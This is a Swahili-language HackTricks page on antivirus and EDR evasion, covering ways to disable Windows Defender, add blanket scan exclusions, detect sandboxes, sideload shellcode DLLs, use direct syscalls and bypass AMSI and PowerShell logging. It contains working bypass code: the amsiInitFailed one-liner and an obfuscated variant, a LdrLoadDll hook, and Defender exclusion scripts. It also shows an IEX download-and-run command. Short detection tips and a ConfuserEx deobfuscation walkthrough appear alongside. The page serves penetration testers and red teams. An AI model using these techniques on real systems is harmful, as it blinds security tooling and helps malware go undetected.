# Kukwepa Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Ukurasa huu uliandikwa awali na** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Kusimamisha Defender

- [defendnot](https://github.com/es3n1n/defendnot): Tool ya kusimamisha Windows Defender kufanya kazi.
- [no-defender](https://github.com/es3n1n/no-defender): Tool ya kusimamisha Windows Defender kwa kujifanya kuwa AV nyingine.
- [Kuzima Defender ikiwa wewe ni admin](basic-powershell-for-pentesters/README.md)

### Mtego wa UAC wa mtindo wa installer kabla ya kuchezea Defender

Public loaders zinazojifanya kuwa game cheats mara nyingi husambazwa kama installers za Node.js/Nexe ambazo hazijasainiwa, na kwanza **humwomba mtumiaji ruhusa za elevation**, kisha huizima Defender. Mtiririko ni rahisi:

1. Kagua ikiwa kuna muktadha wa kiutawala kwa kutumia `net session`. Amri hiyo hufaulu tu pale caller anapokuwa na admin rights, kwa hiyo kushindwa kwake kunaonyesha kuwa loader inaendeshwa na mtumiaji wa kawaida.
2. Iwashe upya mara moja kwa kutumia verb ya `RunAs` ili kuanzisha UAC consent prompt inayotarajiwa huku ikihifadhi command line ya awali.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Waathiriwa tayari wanaamini kuwa wanasakinisha software ya “cracked”, hivyo prompt hukubaliwa kwa kawaida, na kuipa malware ruhusa inazohitaji kubadilisha policy ya Defender.<sup>[[26]](#references)</sup>

### Exclusions za `MpPreference` zisizo na mipaka kwa kila herufi ya drive

Baada ya kupata privileges zilizoinuliwa, chains za aina ya GachiLoader huongeza blind spots za Defender badala ya kuzima service moja kwa moja. Loader huanza kwa kuua GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) kisha inaweka **exclusions pana sana**, ili kila user profile, system directory, na removable disk isiweze kuscaniwa:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- Loop hupitia kila filesystem iliyomountiwa (D:\, E:\, USB sticks, n.k.), kwa hiyo **payload yoyote ya baadaye itakayowekwa popote kwenye disk itapuuzwa**.
- Exclusion ya extension `.sys` imeandaliwa kwa ajili ya baadaye—attackers wanahifadhi chaguo la kupakia unsigned drivers baadaye bila kuigusa tena Defender.
- Mabadiliko yote yanawekwa chini ya `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, hivyo stages za baadaye zinaweza kuthibitisha kuwa exclusions zinaendelea kuwepo au kuzipanua bila ku-trigger UAC tena.

Kwa kuwa hakuna Defender service inayosimamishwa, health checks za kawaida zitaendelea kuripoti “antivirus active”, ingawa real-time inspection haigusi kamwe paths hizo.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Kwa sasa, AVs hutumia methods tofauti kuangalia kama file ni malicious au la: static detection, dynamic analysis, na kwa EDRs zilizo advanced zaidi, behavioural analysis.

### **Static detection**

Static detection hufanyika kwa ku-flag strings au arrays za bytes zinazojulikana kuwa malicious ndani ya binary au script, na pia kutoa taarifa kutoka kwenye file lenyewe (k.m. file description, company name, digital signatures, icon, checksum, n.k.). Hii inamaanisha kuwa kutumia public tools zinazojulikana kunaweza kukufanya ukamatwe kwa urahisi zaidi, kwa sababu huenda tayari zimechambuliwa na ku-flagged kuwa malicious. Kuna njia kadhaa za kuepuka aina hii ya detection:

- **Encryption**

Uki-encrypt binary, AV haitakuwa na njia ya kugundua program yako, lakini utahitaji loader wa aina fulani wa ku-decrypt na ku-run program hiyo kwenye memory.

- **Obfuscation**

Wakati mwingine unachohitaji kufanya ni kubadilisha strings fulani ndani ya binary au script yako ili ipite AV, lakini hii inaweza kuchukua muda kulingana na unachojaribu ku-obfuscate.

- **Custom tooling**

Ukitengeneza tools zako mwenyewe, hakutakuwa na known bad signatures, lakini hii inahitaji muda na juhudi nyingi.

> [!TIP]
> Njia nzuri ya ku-check dhidi ya Windows Defender static detection ni [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Kimsingi hugawanya file katika segments nyingi, kisha humwambia Defender ku-scan kila moja kivyake; kwa njia hii, inaweza kukuonyesha kwa usahihi strings au bytes zilizo-flag ndani ya binary yako.

Ninakupendekezea sana uangalie [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) hii kuhusu practical AV Evasion.

### **Dynamic analysis**

Dynamic analysis ni pale AV inapo-run binary yako kwenye sandbox na kufuatilia malicious activity (k.m. kujaribu ku-decrypt na kusoma passwords za browser yako, kufanya minidump kwenye LSASS, n.k.). Sehemu hii inaweza kuwa ngumu zaidi kufanya nayo kazi, lakini haya ni baadhi ya mambo unayoweza kufanya ili kuepuka sandboxes.

- **Sleep before execution** Kulingana na jinsi inavyotekelezwa, hii inaweza kuwa njia nzuri ya kupita AV's dynamic analysis. AVs huwa na muda mfupi sana wa ku-scan files ili zisikatize workflow ya mtumiaji, kwa hiyo kutumia sleeps ndefu kunaweza kuvuruga analysis ya binaries. Tatizo ni kwamba sandboxes nyingi za AV zinaweza kuruka sleep kulingana na jinsi ilivyotekelezwa.
- **Checking machine's resources** Kwa kawaida, Sandboxes huwa na resources chache sana za kutumia (k.m. < 2GB RAM), vinginevyo zinaweza kupunguza kasi ya machine ya mtumiaji. Unaweza pia kuwa creative sana hapa, kwa mfano ku-check temperature ya CPU au hata fan speeds; si kila kitu kitatekelezwa kwenye sandbox.
- **Machine-specific checks** Ikiwa unataka kumlenga mtumiaji ambaye workstation yake imeunganishwa kwenye domain ya "contoso.local", unaweza ku-check domain ya computer ili kuona kama inalingana na uliyobainisha; ikiwa hailingani, unaweza kufanya program yako itoke.

Imebainika kuwa computername ya Microsoft Defender's Sandbox ni HAL9TH, kwa hiyo unaweza ku-check computer name kwenye malware yako kabla ya detonation. Ikiwa jina linalingana na HAL9TH, inamaanisha uko ndani ya defender's sandbox, hivyo unaweza kufanya program yako itoke.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Baadhi ya tips nyingine nzuri sana kutoka kwa [@mgeeky](https://twitter.com/mariuszbit) za kufanya kazi dhidi ya Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Kama tulivyosema awali kwenye post hii, **public tools** hatimaye **zitagunduliwa**, kwa hiyo unapaswa kujiuliza jambo moja:

Kwa mfano, ikiwa unataka kufanya dump ya LSASS, **unahitaji kweli kutumia mimikatz**? Au unaweza kutumia project tofauti ambayo haijulikani sana na pia hufanya dump ya LSASS.

Jibu sahihi huenda likawa la pili. Tukitumia mimikatz kama mfano, huenda ni mojawapo ya, au hata ndiyo, malware iliyo-flagged zaidi na AVs na EDRs. Ingawa project yenyewe ni nzuri sana, pia ni nightmare kufanya nayo kazi ili kupita AVs, kwa hiyo tafuta tu alternatives za kile unachojaribu kutimiza.

> [!TIP]
> Unapobadilisha payloads zako kwa ajili ya evasion, hakikisha **unazima automatic sample submission** kwenye Defender, na tafadhali, kwa uzito, **USIPAKIE KWENYE VIRUSTOTAL** ikiwa lengo lako ni kufanikisha evasion kwa muda mrefu. Ikiwa unataka ku-check kama payload yako inagunduliwa na AV fulani, install kwenye VM, jaribu kuzima automatic sample submission, kisha i-test hapo hadi uridhike na matokeo.

## EXEs vs DLLs

Kila inapowezekana, daima **ipa kipaumbele kutumia DLLs kwa ajili ya evasion**. Kwa uzoefu wangu, DLL files kwa kawaida **hugunduliwa na kuchambuliwa kwa kiwango kidogo sana**, kwa hiyo ni trick rahisi sana ya kutumia ili kuepuka detection katika baadhi ya hali (ikiwa payload yako ina njia ya ku-run kama DLL, bila shaka).

Kama tunavyoona kwenye picha hii, DLL Payload kutoka Havoc ina detection rate ya 4/26 kwenye antiscan.me, wakati EXE payload ina detection rate ya 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Sasa tutaonyesha tricks kadhaa unazoweza kutumia na DLL files ili kuwa stealthier zaidi.

## DLL Sideloading & Proxying

**DLL Sideloading** hutumia search order ya DLL inayotumiwa na loader kwa kuweka victim application na malicious payload(s) pamoja kando ya nyingine.

Unaweza ku-check programs zinazoweza kuathiriwa na DLL Sideloading ukitumia [Siofra](https://github.com/Cybereason/siofra) na powershell script ifuatayo:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Amri hii itatoa orodha ya programu zilizo hatarini kwa DLL hijacking ndani ya "C:\Program Files\\" pamoja na faili za DLL ambazo zinajaribu kupakia.

Ninapendekeza sana **uchunguze mwenyewe programu za DLL Hijackable/Sideloadable**, technique hii ni stealthy sana ikifanywa ipasavyo, lakini ukitumia programu za DLL Sideloadable zinazojulikana hadharani, unaweza kugunduliwa kwa urahisi.

Kuweka tu DLL yenye malicious kwa jina ambalo programu inatarajia kupakia hakutapakia payload yako, kwa sababu programu inatarajia functions maalum ndani ya DLL hiyo. Ili kurekebisha suala hili, tutatumia technique nyingine inayoitwa **DLL Proxying/Forwarding**.

**DLL Proxying** hu-forward calls ambazo programu hufanya kutoka kwenye proxy (na malicious) DLL kwenda kwenye DLL asili, hivyo kuhifadhi functionality ya programu na kuwezesha kushughulikia execution ya payload yako.

Nitatumia project ya [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) kutoka kwa [@flangvik](https://twitter.com/Flangvik/)

Hizi ndizo hatua nilizofuata:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Amri ya mwisho itatupatia faili 2: template ya source code ya DLL, na DLL ya awali iliyobadilishwa jina.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Haya ndiyo matokeo:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Shellcode yetu (iliyo-encode kwa [SGN](https://github.com/EgeBalci/sgn)) pamoja na proxy DLL zilikuwa na Detection rate ya 0/26 kwenye [antiscan.me](https://antiscan.me)! Hilo ningeliita mafanikio.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Ninapendekeza sana** utazame [Twitch VOD ya S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) kuhusu DLL Sideloading, pamoja na [video ya ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), ili ujifunze zaidi kuhusu tulichojadili kwa undani zaidi.

### Kutumia vibaya Forwarded Exports (ForwardSideLoading)

Windows PE modules zinaweza ku-export functions ambazo kwa hakika ni "forwarders": badala ya kuonyesha code, export entry huwa na ASCII string yenye muundo wa `TargetDll.TargetFunc`. Caller anapotatua export hiyo, Windows loader itafanya yafuatayo:

- Itapakia `TargetDll` ikiwa bado haijapakiwa
- Itatatua `TargetFunc` kutoka humo

Tabia muhimu za kuelewa:
- Ikiwa `TargetDll` ni KnownDLL, hutolewa kutoka kwenye protected KnownDLLs namespace (kwa mfano, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Ikiwa `TargetDll` si KnownDLL, DLL search order ya kawaida hutumika, ambayo inajumuisha directory ya module inayofanya forward resolution.

Hii huwezesha primitive ya indirect sideloading: tafuta signed DLL inayো-export function iliyoforwardiwa kwenda kwenye non-KnownDLL module name, kisha iweke signed DLL hiyo pamoja na attacker-controlled DLL yenye jina linalolingana kabisa na forwarded target module. Forwarded export inapo-invoked, loader itatatua forward hiyo na kupakia DLL yako kutoka directory hiyo hiyo, na kutekeleza DllMain yako.<sup>[[13]](#references)</sup>

Mfano ulioonekana kwenye Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` si KnownDLL, kwa hiyo inatatuliwa kupitia mpangilio wa kawaida wa utafutaji.

PoC (copy-paste):
1) Nakili system DLL iliyosainiwa kwenye folda inayoweza kuandikwa
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Weka `NCRYPTPROV.dll` hasidi katika folda hiyo hiyo. DllMain ya msingi inatosha kupata code execution; huhitaji kutekeleza forwarded function ili kuanzisha DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Anzisha forward kwa kutumia LOLBin iliyosainiwa:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Tabia iliyobainika:
- rundll32 (signed) hupakia `keyiso.dll` ya side-by-side (signed)
- Wakati wa kutatua `KeyIsoSetAuditingInterface`, loader hufuata forward hadi `NCRYPTPROV.SetAuditingInterface`
- Kisha loader hupakia `NCRYPTPROV.dll` kutoka `C:\test` na kutekeleza `DllMain` yake
- Ikiwa `SetAuditingInterface` haijatekelezwa, utapata hitilafu ya "missing API" baada tu ya `DllMain` kuwa tayari imeendeshwa

Vidokezo vya hunting:
- Lenga exports zilizo-forward ambapo module lengwa si KnownDLL. KnownDLLs zimeorodheshwa chini ya `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Unaweza kuorodhesha exports zilizo-forward kwa kutumia zana kama vile:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Tazama inventory ya Windows 11 forwarder kutafuta candidates: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Mawazo ya detection/ulinzi:
- Fuatilia LOLBins (kwa mfano, rundll32.exe) zinazopakia signed DLLs kutoka kwenye paths zisizo za mfumo, kisha kupakia non-KnownDLLs zenye base name sawa kutoka kwenye directory hiyo
- Toa tahadhari kwa process/module chains kama: `rundll32.exe` → `keyiso.dll` isiyo ya mfumo → `NCRYPTPROV.dll` iliyo chini ya user-writable paths
- Tekeleza code integrity policies (WDAC/AppLocker) na ukatae write+execute katika application directories

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ni payload toolkit ya kubypass EDRs kwa kutumia suspended processes, direct syscalls, na alternative execution methods`

Unaweza kutumia Freeze kupakia na kutekeleza shellcode yako kwa njia ya stealthy.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ni mchezo wa paka na panya; kinachofanya kazi leo kinaweza kugunduliwa kesho, kwa hivyo usitegemee tool moja pekee; ikiwezekana, jaribu kuunganisha mbinu nyingi za evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs mara nyingi huweka **user-mode inline hooks** kwenye syscall stubs za `ntdll.dll`. Ili kupita hooks hizo, unaweza kutengeneza syscall stubs za **direct** au **indirect** zinazopakia **SSN** (System Service Number) sahihi na kuhamia kernel mode bila kutekeleza hooked export entrypoint.<sup>[[32]](#references)</sup>

**Chaguo za invocation:**
- **Direct (embedded)**: weka instruction ya `syscall`/`sysenter`/`SVC #0` kwenye stub iliyotengenezwa (hakuna hit kwenye `ntdll` export).
- **Indirect**: ruka hadi kwenye syscall gadget iliyopo ndani ya `ntdll` ili kernel transition ionekane inaanzia kwenye `ntdll` (inafaa kwa heuristic evasion); **randomized indirect** huchagua gadget kutoka kwenye pool kwa kila call.
- **Egg-hunt**: epuka kuweka static `0F 05` opcode sequence kwenye disk; tafuta syscall sequence wakati wa runtime.

**Mikakati ya hook-resistant SSN resolution:**
- **FreshyCalls (VA sort)**: kadiria SSNs kwa kupanga syscall stubs kulingana na virtual address badala ya kusoma stub bytes.
- **SyscallsFromDisk**: map `\KnownDlls\ntdll.dll` safi, soma SSNs kutoka kwenye `.text` yake, kisha u-unmap (hupita hooks zote za in-memory).
- **RecycledGate**: unganisha VA-sorted SSN inference na opcode validation wakati stub iko safi; ikiwa imehookiwa, rudi kwenye VA inference.
- **HW Breakpoint**: weka DR0 kwenye instruction ya `syscall` na utumie VEH kunasa SSN kutoka `EAX` wakati wa runtime, bila kuchanganua hooked bytes.

Mfano wa matumizi ya SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI iliundwa kuzuia "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Mwanzoni, AVs ziliweza kuchanganua tu **files kwenye disk**, kwa hiyo kama ungeweza kutekeleza payloads **moja kwa moja kwenye memory**, AV isingeweza kufanya chochote kuizuia, kwa kuwa haikuwa na mwonekano wa kutosha.

Kipengele cha AMSI kimeunganishwa katika components hizi za Windows.

- User Account Control, au UAC (elevation ya EXE, COM, MSI, au usakinishaji wa ActiveX)
- PowerShell (scripts, matumizi ya interactive, na dynamic code evaluation)
- Windows Script Host (wscript.exe na cscript.exe)
- JavaScript na VBScript
- Office VBA macros

Huruhusu antivirus solutions kukagua tabia ya script kwa kuonyesha contents za script katika hali ambayo haijasimbwa na haijafichwa kwa obfuscation.

Kuendesha `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` kutazalisha alert ifuatayo kwenye Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Angalia jinsi inavyoweka `amsi:` mwanzoni, kisha path ya executable ambayo script iliendeshwa kutoka kwake, katika hali hii, powershell.exe

Hatukuacha file yoyote kwenye disk, lakini bado tulinaswa kwenye memory kwa sababu ya AMSI.

Zaidi ya hayo, kuanzia **.NET 4.8**, C# code pia hupitishwa kupitia AMSI. Hii hata inaathiri `Assembly.Load(byte[])` kwa ajili ya kupakia execution kwenye memory. Ndiyo maana kutumia versions za chini za .NET (kama 4.7.2 au chini) kunapendekezwa kwa execution kwenye memory ikiwa unataka kukwepa AMSI.

Kuna njia kadhaa za kupita AMSI:

- **Obfuscation**

Kwa kuwa AMSI hufanya kazi hasa kwa static detections, kubadilisha scripts unazojaribu kupakia kunaweza kuwa njia nzuri ya kukwepa detection.

Hata hivyo, AMSI ina uwezo wa ku-unobfuscate scripts hata ikiwa zina layers nyingi, kwa hiyo obfuscation inaweza kuwa chaguo baya kulingana na jinsi inavyofanywa. Hii hufanya kuikwepa isiwe straightforward. Ingawa wakati mwingine unachohitaji kufanya ni kubadilisha majina machache ya variables na utakuwa tayari, kwa hiyo inategemea kiwango ambacho kitu kimeflag.

- **AMSI Bypass**

Kwa kuwa AMSI inatekelezwa kwa kupakia DLL ndani ya process ya powershell (pia cscript.exe, wscript.exe, n.k.), inawezekana kuichezea kwa urahisi hata ukiwa unaendesha kama unprivileged user. Kwa sababu ya dosari hii katika implementation ya AMSI, researchers wamepata njia nyingi za kukwepa AMSI scanning.

**Forcing an Error**

Kulazimisha initialization ya AMSI ishindwe (amsiInitFailed) kutasababisha scan isianzishwe kwa process ya sasa. Hili lilifichuliwa awali na [Matt Graeber](https://twitter.com/mattifestation), na Microsoft imetengeneza signature kuzuia matumizi mapana zaidi.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Kilichohitajika ni mstari mmoja wa powershell code ili kufanya AMSI isitumikike katika powershell process ya sasa. Bila shaka, mstari huu umeflagishwa na AMSI yenyewe, hivyo marekebisho fulani yanahitajika ili kutumia technique hii.

Hii hapa ni AMSI bypass iliyorekebishwa niliyoichukua kutoka kwenye [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Technique hii iligunduliwa awali na [@RastaMouse](https://twitter.com/_RastaMouse/) na inahusisha kutafuta address ya function ya "AmsiScanBuffer" katika amsi.dll (inayohusika na kuscan input iliyotolewa na mtumiaji) na kuiandikisha upya kwa instructions za kurudisha code ya E_INVALIDARG; kwa njia hii, matokeo ya scan halisi yatarudisha 0, ambayo hutafsiriwa kama matokeo safi.

> [!TIP]
> Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) kwa maelezo ya kina zaidi.

Pia kuna techniques nyingine nyingi zinazotumika kubypass AMSI kwa powershell; angalia [**ukurasa huu**](basic-powershell-for-pentesters/index.html#amsi-bypass) na [**repo hii**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) ili kujifunza zaidi kuzihusu.

### Kublocking AMSI kwa kuzuia amsi.dll kupakiwa (LdrLoadDll hook)

AMSI huanzishwa tu baada ya `amsi.dll` kupakiwa katika process ya sasa. Bypass imara isiyohusiana na language ni kuweka user-mode hook kwenye `ntdll!LdrLoadDll` ambayo hurudisha error wakati module inayoombwa ni `amsi.dll`. Kwa sababu hiyo, AMSI haipakwi kamwe na hakuna scans zinazofanyika kwa process hiyo.<sup>[[23]](#references)</sup>

Muhtasari wa implementation (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Vidokezo
- Hufanya kazi katika PowerShell, WScript/CScript na custom loaders kwa pamoja (kitu chochote ambacho kingepakia AMSI).
- Iunganishe na kulisha scripts kupitia stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) ili kuepuka command-line artefacts ndefu.
- Imeonekana ikitumiwa na loaders zinazotekelezwa kupitia LOLBins (kwa mfano, `regsvr32` ikiita `DllRegisterServer`).

Tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** pia hutengeneza script ya kubypass AMSI.
Tool **[https://amsibypass.com/](https://amsibypass.com/)** pia hutengeneza script ya kubypass AMSI inayokwepa signature kwa kutumia function na variables zilizobainishwa na mtumiaji kwa random, character expression, na kutumia random character casing kwenye keywords za PowerShell ili kuepuka signature.

**Ondoa signature iliyobainika**

Unaweza kutumia tool kama **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** na **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** ili kuondoa signature ya AMSI iliyobainika kutoka kwenye memory ya process ya sasa. Tool hii hufanya kazi kwa kuscan memory ya process ya sasa ili kutafuta signature ya AMSI, kisha kui-overwrite kwa instructions za NOP, na hivyo kuiondoa kwenye memory.

**Bidhaa za AV/EDR zinazotumia AMSI**

Unaweza kupata orodha ya bidhaa za AV/EDR zinazotumia AMSI katika **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Tumia Powershell version 2**
Ukitumia PowerShell version 2, AMSI haitapakiwa, hivyo unaweza kuendesha scripts zako bila kuscanwa na AMSI. Unaweza kufanya hivi:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging ni kipengele kinachokuwezesha kurekodi amri zote za PowerShell zinazotekelezwa kwenye mfumo. Hii inaweza kuwa muhimu kwa madhumuni ya auditing na troubleshooting, lakini pia inaweza kuwa **tatizo kwa attackers wanaotaka kukwepa kugunduliwa**.

Ili kukwepa PowerShell logging, unaweza kutumia mbinu zifuatazo:

- **Disable PowerShell Transcription and Module Logging**: Unaweza kutumia tool kama [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) kwa madhumuni haya.
- **Use Powershell version 2**: Uk gebruik PowerShell version 2, AMSI haitapakiwa, hivyo unaweza kuendesha scripts zako bila kuchanganuliwa na AMSI. Unaweza kufanya hivi: `powershell.exe -version 2`
- **Use an unmanaged PowerShell session**: Tumia [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) ku-host PowerShell bila kuzindua `powershell.exe` (njia inayotumiwa na `powerpick` ya Cobalt Strike). Hii hukwepa controls zinazohusishwa mahususi na process ya `powershell.exe`, lakini kwa asili haizuii AMSI, Script Block Logging, au kila defense nyingine ya PowerShell; coverage hutegemea runtime na utekelezaji wa host.


## Obfuscation

> [!TIP]
> Mbinu kadhaa za obfuscation hutegemea encrypting data, jambo ambalo litaongeza entropy ya binary na kufanya iwe rahisi zaidi kwa AVs na EDRs kuigundua. Kuwa mwangalifu na hili, na labda tumia encryption kwenye sehemu maalum tu za code yako ambazo ni nyeti au zinahitaji kufichwa.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Unapochanganua malware inayotumia ConfuserEx 2 (au commercial forks), ni kawaida kukutana na tabaka kadhaa za protection ambazo zitazuia decompilers na sandboxes. Workflow iliyo hapa chini hurejesha kwa uaminifu **IL iliyo karibu na ya awali**, ambayo baadaye inaweza ku-decompile kuwa C# katika tools kama dnSpy au ILSpy.<sup>[[10]](#references)</sup>

1. Anti-tampering removal – ConfuserEx hu-encrypt kila *method body* na ku-decrypt ndani ya *module* static constructor (`<Module>.cctor`). Pia hubadilisha PE checksum ili modification yoyote isababishe binary ku-crash. Tumia **AntiTamperKiller** kutafuta encrypted metadata tables, kurejesha XOR keys na kuandika assembly safi:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output huwa na anti-tamper parameters 6 (`key0-key3`, `nameHash`, `internKey`) ambazo zinaweza kuwa muhimu wakati wa kutengeneza unpacker yako mwenyewe.

2. Symbol / control-flow recovery – peleka file *clean* kwenye **de4dot-cex** (fork ya de4dot inayotambua ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – chagua profile ya ConfuserEx 2
• de4dot itatengua control-flow flattening, kurejesha namespaces, classes na variable names za awali, na ku-decrypt constant strings.

3. Proxy-call stripping – ConfuserEx hubadilisha direct method calls kuwa lightweight wrappers (zinazojulikana pia kama *proxy calls*) ili kuvuruga zaidi decompilation. Ziondoe kwa **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Baada ya hatua hii unapaswa kuona .NET API za kawaida kama `Convert.FromBase64String` au `AES.Create()` badala ya opaque wrapper functions (`Class8.smethod_10`, …).

